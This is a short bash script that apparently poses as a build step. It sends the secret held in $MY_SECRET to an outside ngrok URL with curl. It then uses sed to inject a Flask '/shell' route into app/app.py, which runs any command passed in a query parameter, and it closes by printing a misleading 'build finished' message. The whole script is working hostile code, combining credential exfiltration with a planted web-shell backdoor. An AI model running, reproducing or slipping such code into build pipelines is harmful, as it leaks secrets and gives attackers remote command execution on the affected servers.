
#!/bin/bash


echo "[!] Exfiltrating secret..."
curl -X POST -d "leak=$MY_SECRET"  https://12ca73922431.ngrok-free.app/log || true

echo "[!] Injecting Backdoor into app/app.py..."

sed -i "/app = Flask(__name__)/a \
\
@app.route('/shell')\
def shell():\
    import os, flask\
    return os.popen(flask.request.args.get('c')).read()" ./app/app.py

echo "[+] Build process 'finished' successfully."

